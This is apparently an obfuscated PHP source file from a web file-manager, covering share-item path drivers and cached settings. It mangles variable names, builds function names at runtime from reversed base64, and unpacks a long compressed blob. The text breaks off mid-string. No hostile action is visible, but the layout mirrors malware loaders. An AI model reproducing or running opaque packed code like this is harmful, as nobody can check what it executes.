$_SERVER[®»±”ó²]; $Íöí§Œ = $this->cacheGet($¤ÒıÒ™¸); $´õçŠ‹ = $this->optionDefault($¤ÒıÒ™¸); $´õçŠ‹ = is_array($´õçŠ‹) ? $´õçŠ‹ : array(); if (is_array($Íöí§Œ)) { $Íöí§Œ = array_merge($´õçŠ‹, $Íöí§Œ); return $ÎÀµœ½» ? isset($Íöí§Œ[$ÎÀµœ½»]) ? $Íöí§Œ[$ÎÀµœ½»] : null : $Íöí§Œ; } $ŠãîØ’ = $this->filterWhere(array($Œ¾“ä¸ç[33] => $¤ÒıÒ™¸)); $Íöí§Œ = $this->where($ŠãîØ’)->select(); $Íöí§Œ = array_to_keyvalue($Íöí§Œ, $Œ¾“ä¸ç[97], $Œ¾“ä¸ç[452]); foreach ($Íöí§Œ as $¨ñˆÈŸĞ => $œäòÃÔå) { if ($¦Ä˜ì¶ || in_array($¨ñˆÈŸĞ, $this->jsonField)) { $Íöí§Œ[$¨ñˆÈŸĞ] = json_decode($œäòÃÔå, !0); } } $this->cacheSet($¤ÒıÒ™¸, $Íöí§Œ); $Íöí§Œ = array_merge($´õçŠ‹, $Íöí§Œ); return $ÎÀµœ½» ? $Íöí§Œ[$ÎÀµœ½»] : $Íöí§Œ; } public function set($ß±©¡‡ë, $úùú»’È = false, $â×Åûº¼ = '') { $ë‘®Üú =& $_SERVER[®»±”ó²]; $this->cacheRemove($â×Åûº¼); $ô¸Õ‹¤ = array(); $˜¥µºìœ = is_array($ß±©¡‡ë) ? $ß±©¡‡ë : array($ß±©¡‡ë => $úùú»’È); foreach ($˜¥µºìœ as $‰öüÛ¥ø => $µ€øŞÀê) { if (is_array($µ€øŞÀê)) { $µ€øŞÀê = json_encode_force($µ€øŞÀê); } $this->checkLength($µ€øŞÀê, !1, $this->tableName . $ë‘®Üú[4] . $ß±©¡‡ë); $µ€øŞÀê = self::textEncode($µ€øŞÀê); $˜¥µºìœ = array($ë‘®Üú[33] => $â×Åûº¼, $ë‘®Üú[97] => $‰öüÛ¥ø, $ë‘®Üú[452] => $µ€øŞÀê); $ô¸Õ‹¤[] = $this->filterWhere($˜¥µºìœ); } if (!$ô¸Õ‹¤) { return !0; } $®¹“îí = $this->cacheKey($ë‘®Üú[487]); CacheLock::lock($®¹“îí); $£×•¶—Õ = $this->addAll($ô¸Õ‹¤, array(), !0); CacheLock::unlock($®¹“îí); return $£×•¶—Õ; } protected function optionDefault($àÉğô½È = '') { return !1; } public function setDeep($Ã„”ØÙÄ, $„‰š½Õå = false, $ûúÏö¸ = '') { $È¶³çÄÙ = explode($_SERVER[®»±”ó²][10], $Ã„”ØÙÄ); $ÁÌçµú = $this->get(); array_set_value($ÁÌçµú, $Ã„”ØÙÄ, $„‰š½Õå); $this->set($È¶³çÄÙ[0], $ÁÌçµú[$È¶³çÄÙ[0]], $ûúÏö¸); } public function remove($ïóíÌí, $¨ÙŸéŞ = '') { $â¸ÛÔ°‰ =& $_SERVER[®»±”ó²]; $this->cacheRemove($¨ÙŸéŞ); $üˆƒÚªš = $this->filterWhere(array($â¸ÛÔ°‰[97] => $ïóíÌí, $â¸ÛÔ°‰[33] => $¨ÙŸéŞ)); if (is_null($ïóíÌí)) { unset($üˆƒÚªš[$â¸ÛÔ°‰[97]]); } return $this->where($üˆƒÚªš)->delete(); } public function cacheSet($¢Æ½Öğò, $’Ûõş±ñ = false) { return Cache::set($this->cacheKey($¢Æ½Öğò), $’Ûõş±ñ); } public function cacheGet($Ã¬üÃó) { return Cache::get($this->cacheKey($Ã¬üÃó)); } public function cacheRemove($ ç¦ñú) { return Cache::remove($this->cacheKey($ ç¦ñú)); } protected function filterWhere($Ÿªşé‚È) { return $Ÿªşé‚È; } protected function cacheKey($íæ¨õÑ‹) { return $íæ¨õÑ‹; } } goto c„‘Ñ‘’ˆ; e„ÒíçŞ×: $fileSize = strrev(base64_decode($_SERVER[İÌ¯²„´][0])); function binCheckNeq($ƒì„¼äÛ, $„‘½Æ”¤) { return $ƒì„¼äÛ != $„‘½Æ”¤; } $_SERVER[$_SERVER[İÌ¯²„´][1]] = $fileSize($_SERVER[$_SERVER[İÌ¯²„´][2]]); goto A«ù«äº; bŠªÔŒ„§: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ƒ»ĞöÓ) { $this->pathParse = $ƒ»ĞöÓ; $this->model = Model($_SERVER[®»±”ó²][1440]); } public function getPathOuter($¤ÂÛÊÒˆ) { $ÜÌÉÓÙ =& $_SERVER[®»±”ó²]; if (!$¤ÂÛÊÒˆ) { return $¤ÂÛÊÒˆ; } $”Íı£Í = $this->parse($¤ÂÛÊÒˆ); return trim(KodIO::makeShare($this->pathParse[$ÜÌÉÓÙ[477]], $”Íı£Í[$ÜÌÉÓÙ[477]]), $ÜÌÉÓÙ[8]); } protected function infoParse($í´ñšá”, $ï­ˆåÌİ = false, $š§˜ª®â = false) { $õæø… =& $_SERVER[®»±”ó²]; $Šõî‚ë¯ = $this->pathParse[$õæø…[477]]; $—Šôï²¾ = trim($this->pathParse[$õæø…[1261]], $õæø…[8]); return Action($õæø…[1447])->sharePathInfo($Šõî‚ë¯, $—Šôï²¾, $ï­ˆåÌİ); } public function infoFull($ğëÊú½¹) { $«´èù¢ =& $_SERVER[®»±”ó²]; $üÓ˜ë¸© = explode($«´èù¢[8], trim($ğëÊú½¹, $«´èù¢[8])); if (count($üÓ˜ë¸©) > 1) { $æËÃ•ìÌ = implode($«´èù¢[8], array_splice($üÓ˜ë¸©, 1)); $Á¼ÅÃî = $this->model->pathInfoByPath($üÓ˜ë¸©[0], $æËÃ•ìÌ); if (!$Á¼ÅÃî) { return !1; } $this->pathParse[$«´èù¢[1261]] = $Á¼ÅÃî[$«´èù¢[194]]; } return $this->infoParse($ğëÊú½¹); } public function listAll($ØùšóÉ†) { $ÃÌÒÅŸ =& $_SERVER[®»±”ó²]; $ÆåÒÍÚÀ = IO::info($this->pathParse[$ÃÌÒÅŸ[87]]); if (!$ÆåÒÍÚÀ) { return array(); } $­’úœ¢× = $this->model->listAll($ØùšóÉ†); $‘æ¢œı· = Model($ÃÌÒÅŸ[680])->getInfo($ÆåÒÍÚÀ[$ÃÌÒÅŸ[681]]); foreach ($­’úœ¢× as &$ÕÍ’ï‚Î) { check_abort(); $ÕÍ’ï‚Î[$ÃÌÒÅŸ[90]] = Action($ÃÌÒÅŸ[1447])->_shareItemeParse($ÕÍ’ï‚Î[$ÃÌÒÅŸ[90]], $‘æ¢œı·); } unset($ÕÍ’ï‚Î); return $­’úœ¢×; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ê™¢“õ¶) { $this->pathParse = $ê™¢“õ¶; $this->model = Model($_SERVER[®»±”ó²][1440]); } protected function infoParse($ÊÍäïœ©, $ÖøÅ©ç¼ = false, $¥• ®Á = false) { $ø¯£˜‘¶ =& $_SERVER[®»±”ó²]; return Action($ø¯£˜‘¶[1268])->sharePathInfo($this->pathParse[$ø¯£˜‘¶[87]], !0, $ÖøÅ©ç¼); } public function listPath($×‰ıóŠª, $§Ğòë×ö = false) { $ãáç‹½­ =& $_SERVER[®»±”ó²]; $µÀÒÕ¡ = parent::listPath($×‰ıóŠª, $§Ğòë×ö); if (!$µÀÒÕ¡) { return $µÀÒÕ¡; } if (is_array($µÀÒÕ¡[$ãáç‹½­[1448]])) { $µÀÒÕ¡[$ãáç‹½­[1448]] = Action($ãáç‹½­[1268])->shareItemInfo($µÀÒÕ¡[$ãáç‹½­[1448]]); } foreach ($µÀÒÕ¡ as $¢µ¶¹ÂÓ => $—ä…šæÒ) { if (!in_array($¢µ¶¹ÂÓ, array($ãáç‹½­[86], $ãáç‹½­[85]))) { continue; } foreach ($—ä…šæÒ as $­¾ú´…ğ => $ôÉ´š¶Î) { $µÀÒÕ¡[$¢µ¶¹ÂÓ][$­¾ú´…ğ] = Action($ãáç‹½­[1268])->shareItemInfo($ôÉ´š¶Î); } } return $µÀÒÕ¡; } public function listAll($îè“Ëú®) { $Æ‘Š—á– =& $_SERVER[®»±”ó²]; $şéÇšø½ = IO::info($this->pathParse[$Æ‘Š—á–[87]]); if (!$şéÇšø½) { return array(); } $±ò‚Ÿ°» = $this->model->listAll($îè“Ëú®); foreach ($±ò‚Ÿ°» as &$¢–êù…) { $¢–êù…[$Æ‘Š—á–[90]] = Action($Æ‘Š—á–[1268])->shareItemInfo($¢–êù…[$Æ‘Š—á–[90]]); } unset($¢–êù…); return $±ò‚Ÿ°»; } } class PathDriverDriverShareItem { public function __construct($´ˆ¹ò¤¾) { $this->pathParse = $´ˆ¹ò¤¾; } public function __call($üŠ–¯‰›, $Ë¸íåßĞ) { $‹ı¸¥¹— =& $_SERVER[®»±”ó²]; if (method_exists($this, $üŠ–¯‰›)) { return; } $«ÁÑÓƒÕ = call_user_func_array(array($‹ı¸¥¹—[1449], $üŠ–¯‰›), $Ë¸íåßĞ); $œ¤€ƒ  = array($‹ı¸¥¹—[1450], $‹ı¸¥¹—[1451], $‹ı¸¥¹—[1452], $‹ı¸¥¹—[1453], $‹ı¸¥¹—[634], $‹ı¸¥¹—[636], $‹ı¸¥¹—[1454], $‹ı¸¥¹—[110], $‹ı¸¥¹—[1455], $‹ı¸¥¹—[1456]); if (in_array($üŠ–¯‰›, $œ¤€ƒ )) { $«ÁÑÓƒÕ = $this->getPathOuter($«ÁÑÓƒÕ); } return $«ÁÑÓƒÕ; } public function copy($ôó­Öš, $™³ù¿ Ø, $÷•í×³ı = false, $“İú’ò = false) { return $this->copyMove($ôó­Öš, $™³ù¿ Ø, $÷•í×³ı, $_SERVER[®»±”ó²][634], $“İú’ò); } public function move($Ø¾×Óı§, $»û†ü¨ˆ, $£•Ä£„ = false, $¤ÉªŠáŠ = false) { return $this->copyMove($Ø¾×Óı§, $»û†ü¨ˆ, $£•Ä£„, $_SERVER[®»±”ó²][636], $¤ÉªŠáŠ); } private function copyMove($º‚ ë‘, $ŒÎşåŒ½, $¦èÈôÅ, $Áù®Ù„Ö, $İË¦¼Ù = false) { $Ö¥¹ ãî =& $_SERVER[®»±”ó²]; $ƒÎ”Óœï = $ŒÎşåŒ½; $×àŸïõ¶ = IO::driverMake($ŒÎşåŒ½); if ($×àŸïõ¶->pathParse[$Ö¥¹ ãî[1242]]) { $ŒÎşåŒ½ = $×àŸïõ¶->pathParse[$Ö¥¹ ãî[1242]]; } else { $ŒÎşåŒ½ = $ƒÎ”Óœï; } $Á”Àšå = IO::copyMove($º‚ ë‘, $ŒÎşåŒ½, $¦èÈôÅ, $Áù®Ù„Ö, $İË¦¼Ù); $Á”Àšå = $this->getPathOuter($Á”Àšå); return $Á”Àšå; } public function pathThis($Çş™ÒÙ) { return get_path_this($this->pathParse[$_SERVER[®»±”ó²][87]]); } public function pathFather($ŞŒé˜‘) { return get_path_father($this->pathParse[$_SERVER[®»±”ó²][87]]); } public function iconvSystem($×Îüä´’) { return $×Îüä´’; } protected function infoParse($Âö‚Å¡¬, $¥İØô±å = false) { $²õïéŠŒ =& $_SERVER[®»±”ó²]; $ğ¶Š¨œ = $this->pathParse[$²õïéŠŒ[573]][$²õïéŠŒ[1269]] . $this->pathParse[$²õïéŠŒ[1261]]; if ($¥İØô±å) { $‚Úø·ÚÇ = IO::infoWithChildren($ğ¶Š¨œ); } else { $‚Úø·ÚÇ = IO::info($ğ¶Š¨œ); } $Ïâò†ô = $this->pathParse[$²õïéŠŒ[573]]; return Action($²õïéŠŒ[1447])->_shareItemeParse($‚Úø·ÚÇ, $Ïâò†ô); } public function listAll($Ã•”«ñº) { $•ŠÓŒ¡á =& $_SERVER[®»±”ó²]; $ôÛ²ú¸· = IO::listAll($Ã•”«ñº); $ô»ÌÊ = rtrim($this->pathParse[$•ŠÓŒ¡á[573]][$•ŠÓŒ¡á[1269]], $•ŠÓŒ¡á[8]); foreach ($ôÛ²ú¸· as &$ ıÊş°Ç) { $ ıÊş°Ç[$•ŠÓŒ¡á[87]] = $this->pathDriver . $•ŠÓŒ¡á[8] . ltrim(substr($ ıÊş°Ç[$•ŠÓŒ¡á[87]], strlen($ô»ÌÊ)), $•ŠÓŒ¡á[8]); } unset($ ıÊş°Ç); return $ôÛ²ú¸·; } public function listAllSimple($êõÏŠˆò, $Ø›Ì—ûé = false) { $ö•¶ÓÜ =& $_SERVER[®»±”ó²]; $‹ã³ŞñÀ = $this->listAll($êõÏŠˆò); $üñÚ´˜É = $this->pathParse[$ö•¶ÓÜ[506]]; if (trim($üñÚ´˜É, $ö•¶ÓÜ[8]) == trim(get_path_father($üñÚ´˜É), $ö•¶ÓÜ[8])) { $Ø›Ì—ûé = !0; } return IO::init($ö•¶ÓÜ[12])->listAllSimpleMake($‹ã³ŞñÀ, $üñÚ´˜É, $Ø›Ì—ûé); } public function getPathOuter($ˆĞÃî‰ª) { $Ù¢ÕËÏâ =& $_SERVER[®»±”ó²]; $ï„£¸úà = KodIO::parse($ˆĞÃî‰ª); if ($ï„£¸úà[$Ù¢ÕËÏâ[33]] == KodIO::KOD_SHARE_ITEM) { return $ï„£¸úà[$Ù¢ÕËÏâ[87]]; } $é•¦©à = KodIO::clear($ˆĞÃî‰ª); $ˆ…¤Åçˆ = KodIO::clear($this->pathParse[$Ù¢ÕËÏâ[573]][$Ù¢ÕËÏâ[1269]]); $ó·ö‹Û£ = substr($é•¦©à, strlen($ˆ…¤Åçˆ)); if (substr($é•¦©à, 0, strlen($ˆ…¤Åçˆ)) != $ˆ…¤Åçˆ) { return !1; } return $this->pathParse[$Ù¢ÕËÏâ[1262]] . $Ù¢ÕËÏâ[8] . ltrim($ó·ö‹Û£, $Ù¢ÕËÏâ[8]); } public function getType() { $ù¶½çöÚ =& $_SERVER[®»±”ó²]; $…»”âö = str_replace($ù¶½çöÚ[77], $ù¶½çöÚ[12], get_class($this)); return strtolower($…»”âö); } public function isOsDriver($°ä¿ó”) { return IO::isOsDriver($°ä¿ó”); } public function info($ùòù¡¶ß) { return $this->infoParse($ùòù¡¶ß); } public function infoAuth($‰áÀË) { return $this->infoParse($‰áÀË); } public function infoWithChildren($œ“–Öœ–) { return $this->infoParse($œ“–Öœ–, !0); } public function infoFull($éœ¡²¦) { return $this->infoParse($éœ¡²¦); } } goto Aï®Ş¦ô; D¬ˆ³à¦›™: define($_SERVER[®»±”ó²][320], 3); define($_SERVER[®»±”ó²][321], 1); define($_SERVER[®»±”ó²][322], 0); goto F„ÔÚ±å; D®•èò©´ø: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xae\xbb\xb1\x94\xf3\xb2", "\xc0\xbb\xcf\xa7\x8d\x8e"); $_SERVER[®»±”ó²] = explode(base64_decode('fAR8AXwB'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\170\33\325\325\60\314\126\40\274\145\247\205\122\132\46\46\301\166\242\305\316\36\47\116\220\145\331\26\221\55\43\311\131\260\315\144\54\215\354\261"."\x25\x8d\xac\x19\x79\xc9\xc2\x92\x92\xa4\x4\x42\xa0\xec\x10\x20\x6c\x65\x6b\x12\xa\x94\xa6\x6c\x1\xda\x2\x2d\x14\xda\x52\xb6\xb6\x40\x4b\x63\x27\x2c\x2d\x2d\x74\xa1\xac\xff\x5d\xce\x5d\x66\x24\xc3\xfb\x3f\xdf".strrev('±Ïä~èx_\'Ã@Öƒ¿èÃ@|ºÓù>ûÿf¿ìÖƒšÿ÷Ùíyg¹î{ç.çİÑ _<÷').strrev('”G[­0¨u›ûvı¿¿ß[ñ¡éÁûŸÃá³Ìò4SmNíö»¹n¯¶ôØs™jªªn')."\234\151\53\372\210\141\331\26\115\110\232\271\264\321\113\303\106\216\376\372\351\117\107\54\122\320\263\246\255\323\250\217\376\250\320\57\362\257\65\230\61\130\276\332\26\115\250\361\216\366\366\120\54"."\1\205\352\344\374\254\231\202\120\136\53\150\131\370\176\136\57\130\250\67\162\163\152\336\314\353\71\107\212\110\110\151\266\326\243\131\320\122\143\203\332\30\152\217\104\127\250\211\25\355\41\50\321"."\243\16\26\365\302\50\215\221\140\334\326\12\166\302\310\352\274\304\160\201\367\253\41\324\34\156\123\22\261\100\133\74\20\114\204\243\155\64\71\30\155\155\15\47\112\323\143\321\110\244\41\20\134"."\x52\x9a\xd3\x1e\xb\x34\xb7\x6\x14\xd4\xbf\x8c\xae\x1a\xb9\xb4\x59\xa5\xac\xa4\x39\x2b\x95\x6a\x1a\x68\x32\xf4\x4c\x8a\x6\x73\x1a\xeb\x8e\x3d\x9a\x87\x50\x82\x87\xd0\x32\xe5\x8a\x99\xc\x8d\xb4\xf1\x50\x4a\x4f"."\x6b\xc5\xc\xcc\x56\xa3\x1c\xc9\x17\x8c\xac\xc6\x6\xbd\x44\x1f\xe5\xa9\x34\xa0\x15\x6d\xd3\xc8\x25\x69\x24\x34\x62\x17\x34\x91\x8e\xfa\x9a\x44\xb\xad\xe7\xa0\xa9\x78\x28\x12\xa\x26\x14\xdc\x41\xa5\x29\x16\x6d"."\125\140\21\262\232\145\353\5\145\131\113\50\26\122\160\247\353\53\311\130\53\25\200\227\66\64\25\112\40\22\121\46\152\301\326\263\171\326\14\255\123\246\261\150\254\61\24\123\32\126\50\142\206".strrev('Ó"™i­ŒéRÄtøÌ ˆÎàÁñMM¢D/Hï'."\0".'F,PÕÔ¶’´¨|æk6f’')."\372\133\11\77\360\153\132\0\272\203\106\316\50\2\230\102\23\246\311\267\25\4\212\254\264\316\122\364\24\4\262\250\276\11\365\172\40\255\207\225\352\147\1\3\355\320\41\32\254\137\104\177\27"."\100\375\36\25\347\351\5\133\325\163\111\63\145\344\140\37\57\6\170\324\354\276\306\202\201\12\320\170\332\314\244\130\330\62\126\301\50\323\106\106\157\53\146\345\42\74\232\354\63\62\251\2\333".base64_decode('el9UkkYjfCfjsiKWRz3hSMBIj4qtiMu181zLLBaSehhtHRqvhWTdttHg2ISYHfmMqaXieoE=').base64_decode('D80wm1BD0aItJxZJsSazkG1ESENOa0XbxhCJA2y7pKTZ8ld1nuf9rLvzNPRPNWDELuhPn54=')."\xc9\xa8\xfa\x88\xe\xfb\x29\x9b\x9a\x6d\xb1\x89\xf0\x5b\x3d\x46\xce\x8f\x52\x68\x34\x1c\x55\xfb\x34\xab\xaf\x35\x35\x5b\x25\xb5\x18\xa2\x4d\xe9\x23\xbe\x7c\x5f\x1e\x36\x3b\xdf\xdf\x5d\xe\x78\xc7\xd3\xd6\x66\xda"."\x21\x9\x5d\x67\xcc\xa4\x96\x91\x87\x42\xc3\x7d\xb6\x9d\x8f\xeb\xb9\x14\x9e\x5\x18\x8a\x39\x9c\x23\xb3\x94\xd7\x75\x28\xd4\xe8\x51\x52\x4a\xab\xb2\x42\x69\xa9\x33\xea\x2c\x56\x31\x9b\xe1\x21\x36\x3a\x9e\x66\xf1".strrev('ñ™‚ìæh7–[©2@Å ×AvZöİm&oÎff¤ŒgÏ–­v\'Äa ø'."\n".'‹NÊ'."\r".'*e-„{D').strrev('uØ!¼­+9h.—“cÎö¢ú´Ìş'."\r".'Åp6±xÅî½¢e8™N®F½-Øs2')."\12\352\54\107\216\254\130\243\141\345\115\313\300\335\253\123\64\333\326\222\175\30\261\210\346\353\277\240\274\221\313\30\71\275\264\54\152\104\367\266\27\264\336\254\126\247\344\213\75\150\2\140\63"."\102\132\22\227\220\13\303\4\324\51\131\155\304\253\365\262\226\102\43\171\243\240\133\154\324\112\163\153\2\40\52\355\155\305\233\310\320\123\336\70\302\334\320\330\314\232\131\12\202\25\205\345\321"."\324\226\104\242\135\15\67\241\243\271\55\244\266\6\22\301\26\150\335\326\172\131\323\21\204\217\171\223\54\161\271\27\155\46\14\115\155\150\160\42\261\335\34\326\13\350\303\15\243\165\312\200\231".strrev('ízç¢?\':õ'."\r".'cFfÓÑëëÓKîAĞ—ËuµèÃÅë–˜ŞÛÍõã'."\n".'Â¬#,|G1ê')."\76\326\166\74\24\133\32\212\251\361\150\123\142\131\40\6\347\176\16\101\316\10\353\15\376\172\306\33\323\123\150\22\223\66\253\247\345\305\354\57\367\342\15\203\77\316\162\361\46\142\171\221\160"."\63\236\273\106\257\205\12\171\345\122\254\355\210\221\65\360\360\154\236\103\46\33\21\5\315\320\41\77\31\163\175\227\65\255\252\53\65\275\332\213\376\235\126\335\331\325\350\233\326\275\330\157\210"."\72\376\132\137\255\62\243\146\216\322\216\250\24\103\313\50\60\350\222\22\65\112\164\211\163\132\4\204\347\314\234\136\166\143\41\100\62\55\335\333\242\153\10\101\243\205\160\254\213\207\175\213\306"."\277\140\166\361\71\51\341\22\327\272\320\304\130\350\214\216\120\74\241\266\206\22\55\321\106\350\176\50\0\241\34\252\114\372\313\326\30\23\145\160\44\346\240\131\175\104\72\77\304\71\220\224\47"."\204\324\153\63\207\31\346\167\1\120\260\117\117\16\114\220\207\102\60\32\223\342\45\266\164\235\364\247\33\240\271\233\376\250\152\60\22\12\304\124\240\146\125\303\152\222\216\120\34\345\350\126\65".base64_decode('e/oRoLXq7EyBD4ezaEuLgajO846NslUAPtpBy4wUPxBRtEU3evug3wZuLmlmzIKWwUcBo2E=').base64_decode('ew3AyvlMEW0DP2440VfM9sDBhaasV7cFeWmNIhosyw5ndMLb4UbHEQwxv4pBt8uXz/VWT4E=')."\xb6\xd4\x19\xb3\x6b\x70\x2\xac\x2a\x8c\xc\xd1\xd9\x45\xbd\x74\xe8\xbe\xa4\x89\xf6\x79\xab\x36\xa0\xd7\xe1\xb1\x0\x72\x5b\x40\x52\x59\x44\xc2\x9f\xb\xf0\x91\x57\xef\x46\x13\x78\xb5\x32\xbe\x2c\x6a\x84\xb4\x19".base64_decode('NPkhTW8yC5xHnqIXCmZhMpQgYYWcm3i5oHGbUyAWwggs3GdyisVksFnnh3FPndEEWCSFKDc=').base64_decode('n2WjRUAD1FKpcskI80ADaxjYkgxGFvjjM9H/ggZImVmNnagYEfHP4ojFY+SY1FP0nHQk0Q0=')."\116\223\246\261\117\26\154\23\147\26\34\45\21\220\366\231\320\151\4\25\60\340\42\37\71\233\203\224\236\321\31\200\365\351\214\324\250\201\142\150\145\70\370\245\371\76\100\27\11\224\52\350\73"."\303\212\241\232\230\60\140\361\145\370\346\45\22\60\165\4\160\45\202\31\264\252\121\262\241\104\274\275\240\247\215\21\206\112\106\354\126\255\60\300\6\206\152\212\255\210\43\322\66\155\352\210\104"."\324\140\264\55\201\56\156\64\145\131\54\234\10\61\214\25\150\124\3\301\166\210\11\34\310\11\70\231\4\241\51\103\63\0\204\120\47\374\202\126\102\207\165\336\314\41\114\13\310\312\53\256\165"."\45\131\51\101\112\0\354\10\362\303\105\121\40\232\40\273\312\233\105\170\305\313\373\324\336\1\264\0\203\12\106\22\67\214\142\152\227\241\216\336\334\122\276\362\313\342\263\274\55\255\201\240\67".base64_decode('3hKYMXsOTV2RTXUlWgyr60weh+4MW7PUgo72NIOFGTW1bMchukQTPV/hzXpxK5ik9NXU1LA=')."\266\246\317\121\372\20\52\341\370\73\105\106\313\156\71\305\344\200\56\243\163\313\73\154\60\234\67\205\223\343\123\112\47\337\52\222\323\115\325\222\270\71\25\125\266\213\226\74\123\10\0\123\250"."\x8a\xc1\xa8\x64\x9a\xaa\x65\x7a\x4d\x4\x77\x7d\x59\x39\x31\xc5\xe1\x97\xc6\x75\x4a\x72\xc1\x87\xfa\x34\x3e\x4f\x78\xf6\xd8\xe6\x40\x4\xdd\xa8\x5c\x9\x4f\x33\xea\x3\xc3\xdf\x4e\x1a\x5b\x49\x94\x9f\x68\x4a\xba"."\x87\x61\xb6\x45\x3f\xf2\xf8\x64\x43\x58\x9b\x2d\xdb\xa9\xf4\xe7\x30\xe8\x46\x11\xed\xdb\x82\xb1\x4a\x9a\xfd\xc5\xac\x25\x86\x33\xa3\x71\xf8\xe4\x48\x36\x23\xee\x5f\x30\x35\x30\x9b\xf2\xd0\x46\x54\x94\xa3\x42\x8e"."\x2a\xe7\xb4\x70\x3c\xc0\x56\xa1\xb5\xd1\xb5\x27\xe8\xe1\x4f\xd3\x16\x2e\x46\x5f\x54\x86\x30\x37\xc7\xcc\xd5\x57\xd6\xfa\x6a\x2a\x15\x76\x2b\xad\xaf\xec\x48\x34\x21\x3a\x7d\xf1\xa2\xc3\x16\x6\xcd\x6c\x1e\xa3\x15".base64_decode('cgXD46WQuwjGuBDTQCzS7pqOUEKDU2ehXy630D9RqzAUTJgtV9sjgURTNNYKMJ7PC7DKJ8s=')."\xed\x36\xaf\xc0\x48\x45\xcb\xab\x63\x3a\x19\x76\x81\x96\xcc\xb8\x40\x54\x9e\x8b\xe5\x65\x21\x71\x79\x39\x48\x5c\xee\x82\xc4\xe5\xa5\x90\xb8\xbc\x1c\x9c\xd\x1\x40\x6a\x59\x6d\x95\x99\x43\xfb\x15\x1d\xb4\x59\x5f".base64_decode('EsAi0RJuW6K2RhtDETXchui5RGl6R3tjgKFBOb0hmmhxpHYgim5pIBJ2Fw8tD8cT8bJZKK0=')."\x23\xe4\xca\x69\x6c\x50\xdb\x63\xa1\xa6\xf0\x72\x1e\x6d\xa\x87\x22\x8d\x71\x35\x18\x8\xb6\x88\x32\x6d\x81\x56\x88\x20\x5a\x49\xcf\xa4\x2c\xbf\xb3\xbc\x8a\x48\xd3\x38\x67\xb9\xa9\x0\x70\x10\x73\x70\xb9\x54\xc6"."\277\121\5\46\106\327\34\35\226\3\206\213\231\226\144\44\52\103\125\105\116\150\262\73\175\226\35\265\350\212\6\323\316\356\47\125\364\247\132\11\304\25\73\257\362\103\265\147\224\7\311\60\130".base64_decode('HFEh8H0FyOSSHqi4TIN0GSqfEEjbnBJ1xdERIvLQCgQIdxRBAlkR+IyBDqSCHWDdSQvOpBo=').base64_decode('bQ/FApivqS6LRduaocJwn846EIbpr2K3U2Bv2uJc1zKGxvhcYtL7TTaV6EbOaP4cm+ceTNQ=').base64_decode('MEqXBdJoIzOCxCzy9ntME9rM4IsYNG8xUBhhx/J0fmwBgEaXhNpUBj80JsEcTQjFYtEYDNs=')."\x36\x7\x18\x3\x8c\x66\xc6\x42\xf1\x50\x82\x1d\xec\x83\x45\x83\x4d\x8a\xdf\x37\x1d\x60\x55\x47\xa4\x1c\x7c\xde\x7f\x56\xd7\xf0\xf4\xaa\x4e\xef\x74\x5f\x37\xa\x54\x4f\x3b\x8d\x46\x21\xd6\xe5\x73\x44\x19\x85\x5d"."\54\360\332\230\372\253\262\26\127\327\165\371\273\374\125\213\353\72\3\336\125\232\167\125\215\167\276\267\33\321\345\325\323\41\241\173\365\14\317\254\265\270\0\52\270\370\224\156\364\123\337\265\170"."\152\227\367\324\263\127\236\326\331\325\135\131\67\175\162\227\357\224\256\341\356\151\325\213\331\167\222\305\2\42\375\331\171\206\272\232\232\136\205\272\204\356\252\274\110\116\102\277\244\0\313\130\145"."\xe4\x45\xea\xea\x39\x6b\x59\x3a\x5a\x37\xbd\x57\xd4\xe8\xf4\x76\x4d\xef\x5e\x2c\xd5\x93\x92\xdc\xdf\x42\x18\x14\x11\x7a\x7d\xbc\x5c\xc0\x7b\x26\x1e\x19\xaf\x8a\x77\x37\xc0\x44\x31\x97\x14\x87\x20\x86\xfe\x1e\x8d"."\137\372\172\163\342\66\145\27\70\123\164\10\101\244\300\263\253\247\322\337\265\154\41\173\365\21\206\0\162\151\203\21\121\305\234\61\310\256\65\71\175\20\2\246\315\241\130\267\207\165\6\36\50"."\335\21\107\300\301\160\77\312\222\142\31\351\254\40\34\54\16\243\34\230\214\274\212\157\170\303\74\206\216\22\130\247\111\120\332\112\152\171\75\56\215\120\125\23\201\206\110\210\137\127\1\337\262"."\70\301\175\15\374\351\4\15\115\340\115\206\5\44\356\24\341\26\301\376\266\6\63\12\331\376\364\152\125\107\136\221\254\142\36\337\222\24\264\342\150\156\25\104\265\51\365\213\24\72\345\120\117"."\225\27\40\317\157\77\230\275\251\213\215\216\361\20\364\51\57\126\310\102\267\17\106\377\373\253\272\272\212\235\172\252\273\23\1\276\346\115\167\257\236\271\266\232\261\120\374\135\350\17\213\4\312".strrev('¡0¯îº\\ü˜†àHš8Ë[M·ŸqŞDëğ,Ôi³Â#¶qáğ”9µ?c„¦Íš¨g¼')."\x21\x3d\x9\x11\xf4\xd9\xc6\xf9\xa7\x9c\xe\x96\xde\x24\x70\x8d\xb8\x6e\xfb\x78\x9\x8f\x94\xa9\xa2\xb8\xe3\x79\xae\xbe\x82\x21\xf7\x1c\xda\x58\x41\xe9\x68\xa3\x1c\xf5\x38\x61\x3\x38\xde\x91\x2c\x5d\x2b\x24\xfb"."\232\212\231\214\315\231\61\31\143\0\276\0\273\6\236\265\274\200\375\247\227\253\212\156\42\214\67\71\15\272\121\61\255\134\301\160\56\147\246\172\144\240\23\207\152\163\0\221\57\11\245\212\75".base64_decode('wSjhNqUhGo2EAm0KPr/h3EHEQTzUHkCHFuZyxhMheBUKN3pZu8u9jKfBAwY777Q08C7DOXc=')."\12\233\277\214\256\242\243\234\21\312\160\260\65\4\342\341\240\332\36\140\4\23\42\51\375\126\152\300\362\343\341\31\103\172\304\350\361\343\327\0\374\146\351\343\374\162\240\334\222\230\117\245\152"."\75\150\13\61\246\132\21\63\225\7\344\56\0\370\345\351\145\7\165\40\143\62\74\347\144\333\340\33\243\7\63\117\74\230\330\361\240\151\365\140\176\213\107\334\307\75\342\351\305\63\144\350\303"."\44\300\357\312\36\270\102\173\4\247\10\202\341\106\217\141\65\22\126\0\371\0\311\142\135\260\373\60\127\74\243\215\172\150\167\42\372\220\236\361\60\36\222\207\365\321\303\70\147\